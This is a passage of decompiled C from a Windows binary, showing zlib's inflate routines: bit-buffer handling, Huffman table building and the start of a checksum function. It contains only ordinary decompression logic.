        local_c = (void *)puVar6[0xd];
        if (local_c < pvVar3) {
          local_14 = (byte *)((int)pvVar3 + (-1 - (int)local_c));
        }
        else {
          local_14 = (byte *)(puVar6[0xb] - (int)local_c);
        }
        if (local_c == (void *)puVar6[0xb]) {
          pvVar4 = (void *)puVar6[10];
          if (pvVar4 != pvVar3) {
            local_c = pvVar4;
            if (pvVar4 < pvVar3) {
              local_14 = (byte *)((int)pvVar3 + (-1 - (int)pvVar4));
            }
            else {
              local_14 = (byte *)((int)(void *)puVar6[0xb] - (int)pvVar4);
            }
          }
        }
        if (local_14 == (byte *)0x0) {
          *(uint **)(puVar6 + 8) = param_1;
          *(byte ***)(puVar6 + 7) = param_2;
          ppbVar7[1] = local_8;
          goto LAB_00404a68;
        }
      }
LAB_004045d7:
      local_10 = (byte *)puVar6[1];
      param_3 = (byte *)0x0;
      if (local_8 < local_10) {
        local_10 = local_8;
      }
      if (local_14 < local_10) {
        local_10 = local_14;
      }
      memcpy(local_c,_Src,(size_t)local_10);
      local_8 = local_8 + -(int)local_10;
      local_c = (void *)((int)local_c + (int)local_10);
      local_14 = local_14 + -(int)local_10;
      _Src = _Src + (int)local_10;
      puVar1 = puVar6 + 1;
      *puVar1 = *puVar1 - (int)local_10;
      if (*puVar1 == 0) {
LAB_0040461c:
        uVar10 = -(uint)(puVar6[6] != 0) & 7;
        goto LAB_00404469;
      }
      break;
    case (undefined *)0x40462b:
      while (param_2 < (byte **)0xe) {
        if (local_8 == (byte *)0x0) goto LAB_00404a58;
        param_3 = (byte *)0x0;
        local_8 = local_8 + -1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
        param_2 = param_2 + 2;
      }
      puVar6[1] = (uint)param_1 & 0x3fff;
      if ((0x1d < ((uint)param_1 & 0x1f)) || (0x3a0 < ((uint)param_1 & 0x3e0))) {
        *puVar6 = 9;
        *(char **)(ppbVar7 + 6) = s_too_many_length_or_distance_symb_0040f668;
        goto switchD_00404408_caseD_404a1f;
      }
      uVar10 = (*(code *)ppbVar7[8])
                         (ppbVar7[10],
                          (((uint)param_1 & 0x3fff) >> 5 & 0x1f) + 0x102 + ((uint)param_1 & 0x1f),4)
      ;
      puVar6[3] = uVar10;
      if (uVar10 != 0) {
        param_1 = (uint *)((uint)param_1 >> 0xe);
        param_2 = (byte **)((int)param_2 + -0xe);
        puVar6[2] = 0;
        *puVar6 = 4;
        goto switchD_00404408_caseD_4046b8;
      }
LAB_00404b1c:
      param_3 = (byte *)0xfffffffc;
      *(uint **)(puVar6 + 8) = param_1;
      *(byte ***)(puVar6 + 7) = param_2;
      ppbVar7[1] = local_8;
      pbVar5 = *ppbVar7;
      *ppbVar7 = _Src;
      ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
      *(void **)(puVar6 + 0xd) = local_c;
      goto LAB_004049e5;
    case (undefined *)0x4046b8:
switchD_00404408_caseD_4046b8:
      if (puVar6[2] < (puVar6[1] >> 10) + 4) {
        do {
          while (param_2 < (byte **)0x3) {
            if (local_8 == (byte *)0x0) goto LAB_00404a58;
            param_3 = (byte *)0x0;
            local_8 = local_8 + -1;
            param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
            _Src = _Src + 1;
            param_2 = param_2 + 2;
          }
          uVar10 = (uint)param_1 & 7;
          param_2 = (byte **)((int)param_2 + -3);
          param_1 = (uint *)((uint)param_1 >> 3);
          *(uint *)(puVar6[3] + *(int *)(&DAT_0040cdf0 + puVar6[2] * 4) * 4) = uVar10;
          puVar6[2] = puVar6[2] + 1;
        } while (puVar6[2] < (puVar6[1] >> 10) + 4);
      }
      while (puVar6[2] < 0x13) {
        *(undefined4 *)(puVar6[3] + *(int *)(&DAT_0040cdf0 + puVar6[2] * 4) * 4) = 0;
        puVar6[2] = puVar6[2] + 1;
      }
      puVar6[4] = 7;
      local_10 = (byte *)FUN_00404fa0((int *)puVar6[3],puVar6 + 4,(int *)(puVar6 + 5),puVar6[9],
                                      (int)ppbVar7);
      if (local_10 == (byte *)0x0) {
        puVar6[2] = 0;
        *puVar6 = 5;
        goto switchD_00404408_caseD_40476e;
      }
      goto LAB_00404ae0;
    case (undefined *)0x40476e:
switchD_00404408_caseD_40476e:
      while (puVar6[2] < (puVar6[1] >> 5 & 0x1f) + 0x102 + (puVar6[1] & 0x1f)) {
        while (param_2 < (byte **)puVar6[4]) {
          if (local_8 == (byte *)0x0) goto LAB_00404a58;
          param_3 = (byte *)0x0;
          local_8 = local_8 + -1;
          param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
          _Src = _Src + 1;
          param_2 = param_2 + 2;
        }
        local_18 = *(uint *)(puVar6[5] + 4 +
                            (*(uint *)(&DAT_0040bca8 + (int)(byte **)puVar6[4] * 4) & (uint)param_1)
                            * 8);
        bVar2 = *(byte *)(puVar6[5] +
                          (*(uint *)(&DAT_0040bca8 + (int)(byte **)puVar6[4] * 4) & (uint)param_1) *
                          8 + 1);
        local_10 = (byte *)(uint)bVar2;
        if (local_18 < 0x10) {
          param_1 = (uint *)((uint)param_1 >> (bVar2 & 0x1f));
          param_2 = (byte **)((int)param_2 - (int)local_10);
          *(uint *)(puVar6[3] + puVar6[2] * 4) = local_18;
          puVar6[2] = puVar6[2] + 1;
        }
        else {
          if (local_18 == 0x12) {
            iVar8 = 7;
          }
          else {
            iVar8 = local_18 - 0xe;
          }
          local_14 = (byte *)(((uint)(local_18 != 0x12) - 1 & 8) + 3);
          while (param_2 < local_10 + iVar8) {
            if (local_8 == (byte *)0x0) goto LAB_00404a58;
            param_3 = (byte *)0x0;
            local_8 = local_8 + -1;
            param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
            _Src = _Src + 1;
            param_2 = param_2 + 2;
          }
          uVar10 = (uint)param_1 >> (bVar2 & 0x1f);
          local_14 = local_14 + (*(uint *)(&DAT_0040bca8 + iVar8 * 4) & uVar10);
          param_1 = (uint *)(uVar10 >> ((byte)iVar8 & 0x1f));
          uVar10 = puVar6[2];
          param_2 = (byte **)((int)param_2 - (int)(local_10 + iVar8));
          if ((byte *)((puVar6[1] >> 5 & 0x1f) + 0x102 + (puVar6[1] & 0x1f)) < local_14 + uVar10) {
LAB_00404a94:
            (*(code *)ppbVar7[9])(ppbVar7[10],puVar6[3]);
            *puVar6 = 9;
            *(char **)(ppbVar7 + 6) = s_invalid_bit_length_repeat_0040f64c;
            *(uint **)(puVar6 + 8) = param_1;
            *(byte ***)(puVar6 + 7) = param_2;
            ppbVar7[1] = local_8;
            pbVar5 = *ppbVar7;
            *ppbVar7 = _Src;
            ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
            *(void **)(puVar6 + 0xd) = local_c;
            FUN_00403bd6((int)puVar6,ppbVar7,-3);
            return;
          }
          if (local_18 == 0x10) {
            if (uVar10 == 0) goto LAB_00404a94;
            uVar9 = *(undefined4 *)((puVar6[3] - 4) + uVar10 * 4);
          }
          else {
            uVar9 = 0;
          }
          do {
            *(undefined4 *)(puVar6[3] + uVar10 * 4) = uVar9;
            uVar10 = uVar10 + 1;
            local_14 = local_14 + -1;
          } while (local_14 != (byte *)0x0);
          puVar6[2] = uVar10;
        }
      }
      puVar6[5] = 0;
      local_18 = 9;
      local_14 = (byte *)0x6;
      local_10 = (byte *)FUN_0040501f((puVar6[1] & 0x1f) + 0x101,(puVar6[1] >> 5 & 0x1f) + 1,
                                      (int *)puVar6[3],&local_18,(uint *)&local_14,&local_30,
                                      &local_2c,puVar6[9],(int)ppbVar7);
      if (local_10 == (byte *)0x0) {
        uVar10 = FUN_00403cc8((char)local_18,(char)local_14,local_30,local_2c,(int)ppbVar7);
        if (uVar10 == 0) goto LAB_00404b1c;
        puVar6[1] = uVar10;
        (*(code *)ppbVar7[9])(ppbVar7[10],puVar6[3]);
        *puVar6 = 6;
        goto switchD_00404408_caseD_404935;
      }
LAB_00404ae0:
      if (local_10 == (byte *)0xfffffffd) {
        (*(code *)ppbVar7[9])(ppbVar7[10],puVar6[3]);
        *puVar6 = 9;
      }
      *(uint **)(puVar6 + 8) = param_1;
      *(byte ***)(puVar6 + 7) = param_2;
      ppbVar7[1] = local_8;
      pbVar5 = *ppbVar7;
      *ppbVar7 = _Src;
      ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
      *(void **)(puVar6 + 0xd) = local_c;
      param_3 = local_10;
      goto LAB_004049e5;
    case (undefined *)0x404935:
switchD_00404408_caseD_404935:
      *(uint **)(puVar6 + 8) = param_1;
      *(byte ***)(puVar6 + 7) = param_2;
      ppbVar7[1] = local_8;
      pbVar5 = *ppbVar7;
      *ppbVar7 = _Src;
      ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
      *(void **)(puVar6 + 0xd) = local_c;
      param_3 = (byte *)FUN_00403cfc((uint)puVar6,ppbVar7,(int)param_3);
      if (param_3 != (byte *)0x1) goto LAB_004049e5;
      param_3 = (byte *)0x0;
      FUN_004042af(puVar6[1],(int)ppbVar7);
      local_8 = ppbVar7[1];
      _Src = *ppbVar7;
      param_1 = (uint *)puVar6[8];
      param_2 = (byte **)puVar6[7];
      local_c = (void *)puVar6[0xd];
      if (local_c < (void *)puVar6[0xc]) {
        local_14 = (byte *)((int)(void *)puVar6[0xc] + (-1 - (int)local_c));
      }
      else {
        local_14 = (byte *)(puVar6[0xb] - (int)local_c);
      }
      if (puVar6[6] != 0) {
        *puVar6 = 7;
        goto switchD_00404408_caseD_404b4a;
      }
      *puVar6 = 0;
      break;
    case (undefined *)0x404a1f:
switchD_00404408_caseD_404a1f:
      *(uint **)(puVar6 + 8) = param_1;
LAB_00404a28:
      *(byte ***)(puVar6 + 7) = param_2;
      ppbVar7[1] = local_8;
      pbVar5 = *ppbVar7;
      *ppbVar7 = _Src;
      param_3 = (byte *)0xfffffffd;
      ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
      *(void **)(puVar6 + 0xd) = local_c;
      goto LAB_004049e5;
    case (undefined *)0x404b4a:
switchD_00404408_caseD_404b4a:
      *(void **)(puVar6 + 0xd) = local_c;
      param_3 = (byte *)FUN_00403bd6((int)puVar6,ppbVar7,(int)param_3);
      local_c = (void *)puVar6[0xd];
      if ((void *)puVar6[0xc] == local_c) {
        *puVar6 = 8;
        goto switchD_00404408_caseD_404b95;
      }
      *(uint **)(puVar6 + 8) = param_1;
      *(byte ***)(puVar6 + 7) = param_2;
      ppbVar7[1] = local_8;
      pbVar5 = *ppbVar7;
      *ppbVar7 = _Src;
      ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
      *(void **)(puVar6 + 0xd) = local_c;
      goto LAB_004049e5;
    case (undefined *)0x404b95:
switchD_00404408_caseD_404b95:
      param_3 = (byte *)0x1;
      *(uint **)(puVar6 + 8) = param_1;
      *(byte ***)(puVar6 + 7) = param_2;
      ppbVar7[1] = local_8;
      pbVar5 = *ppbVar7;
      *ppbVar7 = _Src;
      ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
      *(void **)(puVar6 + 0xd) = local_c;
      goto LAB_004049e5;
    }
    uVar10 = *puVar6;
  }
  param_3 = (byte *)0xfffffffe;
  *(uint **)(puVar6 + 8) = param_1;
  *(byte ***)(puVar6 + 7) = param_2;
  ppbVar7[1] = local_8;
  pbVar5 = *ppbVar7;
  *ppbVar7 = _Src;
  ppbVar7[2] = ppbVar7[2] + (int)(_Src + -(int)pbVar5);
  *(void **)(puVar6 + 0xd) = local_c;
LAB_004049e5:
  FUN_00403bd6((int)puVar6,ppbVar7,(int)param_3);
  return;
}

undefined4 __cdecl FUN_00404be5(int *param_1,int param_2) {
  FUN_004042c0(param_1,param_2,(int *)0x0);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[10]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[9]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return 0;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 __cdecl
FUN_00404c19(int *param_1,uint param_2,uint param_3,int param_4,int param_5,int *param_6,
            uint *param_7,int param_8,uint *param_9,uint *param_10) {
  uint *puVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int *piVar6;
  uint *puVar7;
  byte bVar8;
  int iVar9;
  uint *puVar10;
  uint uVar11;
  uint *puVar12;
  int local_f4 [15];
  uint local_b8 [16];
  uint local_78 [19];
  undefined4 local_2c;
  uint local_28;
  uint *local_24;
  int local_20;
  uint *local_1c;
  uint local_18;
  uint *local_14;
  uint local_10;
  int local_c;
  uint *local_8;
  
  puVar7 = param_7;
  local_78[0] = 0;
  local_78[1] = 0;
  local_78[2] = 0;
  local_78[3] = 0;
  local_78[4] = 0;
  local_78[5] = 0;
  local_78[6] = 0;
  local_78[7] = 0;
  local_78[8] = 0;
  local_78[9] = 0;
  local_78[10] = 0;
  local_78[11] = 0;
  local_78[12] = 0;
  local_78[13] = 0;
  local_78[14] = 0;
  local_78[15] = 0;
  piVar6 = param_1;
  uVar11 = param_2;
  do {
    iVar2 = *piVar6;
    piVar6 = piVar6 + 1;
    local_78[iVar2] = local_78[iVar2] + 1;
    uVar11 = uVar11 - 1;
  } while (uVar11 != 0);
  if (local_78[0] == param_2) {
    *param_6 = 0;
    *param_7 = 0;
  }
  else {
    puVar10 = (uint *)0x1;
    puVar12 = local_78;
    param_7 = (uint *)*param_7;
    do {
      puVar12 = puVar12 + 1;
      if (*puVar12 != 0) break;
      puVar10 = (uint *)((int)puVar10 + 1);
    } while (puVar10 < (uint *)0x10);
    local_8 = puVar10;
    if (param_7 < puVar10) {
      param_7 = puVar10;
    }
    puVar12 = local_78 + 0xf;
    puVar1 = (uint *)0xf;
    do {
      if (*puVar12 != 0) break;
      puVar1 = (uint *)((int)puVar1 - 1);
      puVar12 = puVar12 + -1;
    } while (puVar1 != (uint *)0x0);
    local_1c = puVar1;
    if (puVar1 < param_7) {
      param_7 = puVar1;
    }
    local_78[17] = 1 << ((byte)puVar10 & 0x1f);
    *(uint **)puVar7 = param_7;
    if (puVar10 < puVar1) {
      puVar7 = local_78 + (int)puVar10;
      do {
        uVar11 = *puVar7;
        if ((int)(local_78[17] - uVar11) < 0) {
          return 0xfffffffd;
        }
        puVar10 = (uint *)((int)puVar10 + 1);
        puVar7 = puVar7 + 1;
        local_78[17] = (local_78[17] - uVar11) * 2;
      } while (puVar10 < puVar1);
    }
    local_78[17] = local_78[17] - local_78[(int)puVar1];
    if (local_78[17] < 0) {
      return 0xfffffffd;
    }
    local_b8[1] = 0;
    local_78[(int)puVar1] = local_78[(int)puVar1] + local_78[17];
    iVar9 = 0;
    iVar2 = (int)puVar1 - 1;
    if (iVar2 != 0) {
      iVar4 = 0;
      do {
        iVar9 = iVar9 + *(int *)((int)local_78 + iVar4 + 4);
        iVar2 = iVar2 + -1;
        *(int *)((int)local_b8 + iVar4 + 8) = iVar9;
        iVar4 = iVar4 + 4;
      } while (iVar2 != 0);
    }
    uVar11 = 0;
    do {
      iVar2 = *param_1;
      param_1 = param_1 + 1;
      if (iVar2 != 0) {
        uVar3 = local_b8[iVar2];
        param_10[uVar3] = uVar11;
        local_b8[iVar2] = uVar3 + 1;
      }
      uVar11 = uVar11 + 1;
    } while (uVar11 < param_2);
    uVar11 = local_b8[(int)puVar1];
    local_c = -1;
    local_10 = 0;
    local_14 = param_10;
    iVar2 = -(int)param_7;
    local_b8[0] = 0;
    local_f4[0] = 0;
    local_20 = 0;
    param_1 = (int *)0x0;
    if ((int)local_8 <= (int)local_1c) {
      local_78[18] = (int)local_8 - 1;
      local_24 = local_78 + (int)local_8;
      do {
        uVar3 = *local_24;
        local_18 = uVar3 - 1;
        while (uVar3 != 0) {
          local_2c._2_2_ = (undefined2)(local_2c >> 0x10);
          local_78[16] = (int)param_7 + iVar2;
          if (local_78[16] < (int)local_8) {
            do {
              iVar9 = local_c + 1;
              local_c = iVar9;
              iVar2 = iVar2 + (int)param_7;
              local_78[16] = local_78[16] + (int)param_7;
              param_1 = (int *)((int)local_1c - iVar2);
              if (param_7 < param_1) {
                param_1 = (int *)param_7;
              }
              puVar7 = (uint *)((int)local_8 - iVar2);
              bVar8 = (byte)puVar7;
              uVar3 = 1 << (bVar8 & 0x1f);
              if ((local_18 + 1 < uVar3) &&
                 (iVar4 = uVar3 + (-1 - local_18), puVar12 = local_24, puVar7 < param_1)) {
                while( true ) {
                  puVar7 = (uint *)((int)puVar7 + 1);
                  bVar8 = (byte)puVar7;
                  if (param_1 <= puVar7) break;
                  uVar3 = puVar12[1];
                  puVar12 = puVar12 + 1;
                  uVar5 = iVar4 * 2;
                  if (uVar5 < uVar3 || uVar5 - uVar3 == 0) break;
                  iVar4 = uVar5 - uVar3;
                }
              }
              param_1 = (int *)(1 << (bVar8 & 0x1f));
              uVar3 = *param_9 + (int)param_1;
              if (0x5a0 < uVar3) {
                return 0xfffffffd;
              }
              local_20 = param_8 + *param_9 * 8;
              local_f4[iVar9] = local_20;
              uVar5 = local_10;
              iVar4 = local_20;
              *param_9 = uVar3;
              if (local_c == 0) {
                *param_6 = local_20;
              }
              else {
                local_b8[local_c] = local_10;
                local_2c._0_2_ = CONCAT11((char)param_7,bVar8);
                local_2c = local_2c & 0xffff0000 | (uint)(ushort)local_2c;
                uVar5 = uVar5 >> ((char)iVar2 - (char)param_7 & 0x1fU);
                iVar9 = *(int *)(&stack0xffffff08 + iVar9 * 4);
                local_28 = (iVar4 - iVar9 >> 3) - uVar5;
                *(uint *)(iVar9 + uVar5 * 8) = local_2c;
                *(uint *)(iVar9 + 4 + uVar5 * 8) = local_28;
              }
            } while (local_78[16] < (int)local_8);
          }
          uVar3 = local_18;
          bVar8 = (byte)iVar2;
          if (local_14 < param_10 + uVar11) {
            local_28 = *local_14;
            if (local_28 < param_3) {
              local_2c._0_1_ = (-(local_28 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar9 = (local_28 - param_3) * 4;
              local_2c._0_1_ = *(char *)(iVar9 + param_5) + 'P';
              local_28 = *(uint *)(iVar9 + param_4);
            }
            local_14 = local_14 + 1;
          }
          else {
            local_2c._0_1_ = -0x40;
          }
          local_2c = CONCAT31(CONCAT21(local_2c._2_2_,(char)local_8 - bVar8),(char)local_2c);
          iVar9 = 1 << ((char)local_8 - bVar8 & 0x1f);
          piVar6 = (int *)(local_10 >> (bVar8 & 0x1f));
          if (piVar6 < param_1) {
            puVar7 = (uint *)(local_20 + (int)piVar6 * 8);
            do {
              piVar6 = (int *)((int)piVar6 + iVar9);
              *puVar7 = local_2c;
              puVar7[1] = local_28;
              puVar7 = puVar7 + iVar9 * 2;
            } while (piVar6 < param_1);
          }
          uVar5 = 1 << ((byte)local_78[18] & 0x1f);
          while ((local_10 & uVar5) != 0) {
            local_10 = local_10 ^ uVar5;
            uVar5 = uVar5 >> 1;
          }
          local_10 = local_10 ^ uVar5;
          puVar7 = local_b8 + local_c;
          while (((1 << ((byte)iVar2 & 0x1f)) - 1U & local_10) != *puVar7) {
            local_c = local_c + -1;
            puVar7 = puVar7 + -1;
            iVar2 = iVar2 - (int)param_7;
          }
          local_18 = local_18 - 1;
        }
        local_8 = (uint *)((int)local_8 + 1);
        local_24 = local_24 + 1;
        local_78[18] = local_78[18] + 1;
      } while ((int)local_8 <= (int)local_1c);
    }
    if ((local_78[17] != 0) && (local_1c != (uint *)0x1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}

int __cdecl FUN_00404fa0(int *param_1,uint *param_2,int *param_3,int param_4,int param_5) {
  uint *puVar1;
  int iVar2;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    iVar2 = -4;
  }
  else {
    iVar2 = FUN_00404c19(param_1,0x13,0x13,0,0,param_3,param_2,param_4,&local_8,puVar1);
    if (iVar2 == -3) {
      *(undefined4 *)(param_5 + 0x18) = 0x40f6e4;
    }
    else {
      if ((iVar2 == -5) || (*param_2 == 0)) {
        *(undefined4 *)(param_5 + 0x18) = 0x40f6c0;
        iVar2 = -3;
      }
    }
    (**(code **)(param_5 + 0x24))(*(undefined4 *)(param_5 + 0x28),puVar1);
  }
  return iVar2;
}

int __cdecl
FUN_0040501f(uint param_1,uint param_2,int *param_3,uint *param_4,uint *param_5,int *param_6,
            int *param_7,int param_8,int param_9) {
  uint *puVar1;
  int iVar2;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(param_9 + 0x20))(*(undefined4 *)(param_9 + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00404c19(param_3,param_1,0x101,(int)&DAT_0040ce6c,(int)&DAT_0040cee8,param_6,param_4,
                       param_8,&local_8,puVar1);
  if (iVar2 == 0) {
    if (*param_4 == 0) goto LAB_00405104;
    iVar2 = FUN_00404c19(param_3 + param_1,param_2,0,(int)&DAT_0040cf64,(int)&DAT_0040cfdc,param_7,
                         param_5,param_8,&local_8,puVar1);
    if (iVar2 == 0) {
      if ((*param_5 != 0) || (param_1 < 0x102)) {
        iVar2 = 0;
        goto LAB_00405110;
      }
LAB_004050e8:
      *(undefined4 *)(param_9 + 0x18) = 0x40f750;
    }
    else {
      if (iVar2 == -3) {
        *(undefined4 *)(param_9 + 0x18) = 0x40f790;
        goto LAB_00405110;
      }
      if (iVar2 != -5) {
        if (iVar2 == -4) goto LAB_00405110;
        goto LAB_004050e8;
      }
      *(undefined4 *)(param_9 + 0x18) = 0x40f774;
    }
  }
  else {
    if (iVar2 == -3) {
      *(undefined4 *)(param_9 + 0x18) = 0x40f72c;
      goto LAB_00405110;
    }
    if (iVar2 == -4) goto LAB_00405110;
LAB_00405104:
    *(undefined4 *)(param_9 + 0x18) = 0x40f70c;
  }
  iVar2 = -3;
LAB_00405110:
  (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
  return iVar2;
}

undefined4 __cdecl
FUN_00405122(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4) {
  *param_1 = 9;
  *param_2 = 5;
  *param_3 = 0x40bcf0;
  *param_4 = 0x40ccf0;
  return 0;
}

undefined4 __cdecl
FUN_0040514d(uint param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6) {
  byte bVar1;
  uint uVar2;
  uint uVar3;
  byte **ppbVar4;
  int iVar5;
  byte *pbVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  byte *pbVar12;
  undefined4 uStack44;
  byte *local_14;
  byte *local_10;
  byte *local_c;
  byte *local_8;
  
  ppbVar4 = param_6;
  local_10 = *(byte **)(param_5 + 0x34);
  uVar8 = *(uint *)(param_5 + 0x1c);
  local_c = *param_6;
  local_8 = param_6[1];
  param_6 = *(byte ***)(param_5 + 0x20);
  if (local_10 < *(byte **)(param_5 + 0x30)) {
    local_14 = *(byte **)(param_5 + 0x30) + (-1 - (int)local_10);
  }
  else {
    local_14 = (byte *)(*(int *)(param_5 + 0x2c) - (int)local_10);
  }
  uVar2 = *(uint *)(&DAT_0040bca8 + param_1 * 4);
  uVar3 = *(uint *)(&DAT_0040bca8 + param_2 * 4);
  do {
    while (uVar8 < 0x14) {
      local_8 = local_8 + -1;
      param_6 = (byte **)((uint)param_6 | (uint)*local_c << ((byte)uVar8 & 0x1f));
      local_c = local_c + 1;
      uVar8 = uVar8 + 8;
    }
    pbVar12 = (byte *)(param_3 + (uVar2 & (uint)param_6) * 8);
    bVar1 = *pbVar12;
LAB_004051d5:
    param_1 = (uint)bVar1;
    if (bVar1 != 0) {
      param_6 = (byte **)((uint)param_6 >> (pbVar12[1] & 0x1f));
      uVar8 = uVar8 - pbVar12[1];
      if ((bVar1 & 0x10) != 0) {
        param_1 = param_1 & 0xf;
        uVar10 = *(uint *)(&DAT_0040bca8 + param_1 * 4) & (uint)param_6;
        param_6 = (byte **)((uint)param_6 >> (sbyte)param_1);
        uVar10 = uVar10 + *(int *)(pbVar12 + 4);
        uVar8 = uVar8 - param_1;
        while (uVar8 < 0xf) {
          local_8 = local_8 + -1;
          param_6 = (byte **)((uint)param_6 | (uint)*local_c << ((byte)uVar8 & 0x1f));
          local_c = local_c + 1;
          uVar8 = uVar8 + 8;
        }
        bVar1 = *(byte *)(param_4 + (uVar3 & (uint)param_6) * 8);
        iVar5 = param_4 + (uVar3 & (uint)param_6) * 8;
        param_6 = (byte **)((uint)param_6 >> (*(byte *)(iVar5 + 1) & 0x1f));
        uVar8 = uVar8 - *(byte *)(iVar5 + 1);
        while ((bVar1 & 0x10) == 0) {
          if ((bVar1 & 0x40) != 0) {
            *(char **)(ppbVar4 + 6) = s_invalid_distance_code_0040f618;
            pbVar12 = ppbVar4[1] + -(int)local_8;
            if ((byte *)(uVar8 >> 3) < ppbVar4[1] + -(int)local_8) {
              pbVar12 = (byte *)(uVar8 >> 3);
            }
            uStack44 = 0xfffffffd;
            goto LAB_004053ed;
          }
          iVar7 = (*(uint *)(&DAT_0040bca8 + (uint)bVar1 * 4) & (uint)param_6) + *(int *)(iVar5 + 4)
          ;
          bVar1 = *(byte *)(iVar5 + iVar7 * 8);
          iVar5 = iVar5 + iVar7 * 8;
          param_6 = (byte **)((uint)param_6 >> (*(byte *)(iVar5 + 1) & 0x1f));
          uVar8 = uVar8 - *(byte *)(iVar5 + 1);
        }
        uVar9 = (uint)bVar1 & 0xf;
        while (uVar8 < uVar9) {
          local_8 = local_8 + -1;
          param_6 = (byte **)((uint)param_6 | (uint)*local_c << ((byte)uVar8 & 0x1f));
          local_c = local_c + 1;
          uVar8 = uVar8 + 8;
        }
        uVar11 = *(uint *)(&DAT_0040bca8 + uVar9 * 4) & (uint)param_6;
        uVar8 = uVar8 - uVar9;
        param_6 = (byte **)((uint)param_6 >> (sbyte)uVar9);
        local_14 = local_14 + -uVar10;
        pbVar6 = local_10 + -(uVar11 + *(int *)(iVar5 + 4));
        pbVar12 = *(byte **)(param_5 + 0x28);
        if (pbVar6 < pbVar12) {
          do {
            pbVar6 = pbVar6 + (*(int *)(param_5 + 0x2c) - (int)pbVar12);
          } while (pbVar6 < pbVar12);
          uVar9 = *(int *)(param_5 + 0x2c) - (int)pbVar6;
          if (uVar9 < uVar10) {
            param_1 = uVar10 - uVar9;
            do {
              *local_10 = *pbVar6;
              local_10 = local_10 + 1;
              pbVar6 = pbVar6 + 1;
              uVar9 = uVar9 - 1;
            } while (uVar9 != 0);
            pbVar12 = *(byte **)(param_5 + 0x28);
            do {
              *local_10 = *pbVar12;
              local_10 = local_10 + 1;
              pbVar12 = pbVar12 + 1;
              param_1 = param_1 - 1;
            } while (param_1 != 0);
          }
          else {
            *local_10 = *pbVar6;
            local_10[1] = pbVar6[1];
            local_10 = local_10 + 2;
            pbVar6 = pbVar6 + 2;
            param_1 = uVar10 - 2;
            do {
              *local_10 = *pbVar6;
              local_10 = local_10 + 1;
              pbVar6 = pbVar6 + 1;
              param_1 = param_1 - 1;
            } while (param_1 != 0);
          }
        }
        else {
          *local_10 = *pbVar6;
          local_10[1] = pbVar6[1];
          local_10 = local_10 + 2;
          pbVar6 = pbVar6 + 2;
          param_1 = uVar10 - 2;
          do {
            *local_10 = *pbVar6;
            local_10 = local_10 + 1;
            pbVar6 = pbVar6 + 1;
            param_1 = param_1 - 1;
          } while (param_1 != 0);
        }
        goto LAB_0040536f;
      }
      if ((bVar1 & 0x40) == 0) break;
      if ((bVar1 & 0x20) == 0) {
        *(char **)(ppbVar4 + 6) = s_invalid_literal_length_code_0040f630;
        pbVar12 = ppbVar4[1] + -(int)local_8;
        if ((byte *)(uVar8 >> 3) < ppbVar4[1] + -(int)local_8) {
          pbVar12 = (byte *)(uVar8 >> 3);
        }
        uStack44 = 0xfffffffd;
      }
      else {
        pbVar12 = ppbVar4[1] + -(int)local_8;
        if ((byte *)(uVar8 >> 3) < ppbVar4[1] + -(int)local_8) {
          pbVar12 = (byte *)(uVar8 >> 3);
        }
        uStack44 = 1;
      }
      goto LAB_004053ed;
    }
    param_6 = (byte **)((uint)param_6 >> (pbVar12[1] & 0x1f));
    uVar8 = uVar8 - pbVar12[1];
    local_14 = local_14 + -1;
    *local_10 = pbVar12[4];
    local_10 = local_10 + 1;
LAB_0040536f:
    if ((local_14 < (byte *)0x102) || (local_8 < (byte *)0xa)) {
      pbVar12 = ppbVar4[1] + -(int)local_8;
      if ((byte *)(uVar8 >> 3) < ppbVar4[1] + -(int)local_8) {
        pbVar12 = (byte *)(uVar8 >> 3);
      }
      uStack44 = 0;
LAB_004053ed:
      *(byte ***)(param_5 + 0x20) = param_6;
      *(int *)(param_5 + 0x1c) = uVar8 + (int)pbVar12 * -8;
      ppbVar4[1] = pbVar12 + (int)local_8;
      pbVar6 = *ppbVar4;
      *ppbVar4 = local_c + -(int)pbVar12;
      ppbVar4[2] = ppbVar4[2] + (int)(local_c + -(int)pbVar12 + -(int)pbVar6);
      *(byte **)(param_5 + 0x34) = local_10;
      return uStack44;
    }
  } while( true );
  pbVar12 = pbVar12 + ((*(uint *)(&DAT_0040bca8 + param_1 * 4) & (uint)param_6) +
                      *(int *)(pbVar12 + 4)) * 8;
  bVar1 = *pbVar12;
  goto LAB_004051d5;
}

uint __cdecl FUN_0040541f(uint param_1,byte *param_2,uint param_3) {
  uint uVar1;
  uint uVar2;
  
  if (param_2 == (byte *)0x0) {
    return 0;
  }
  param_1 = ~param_1;
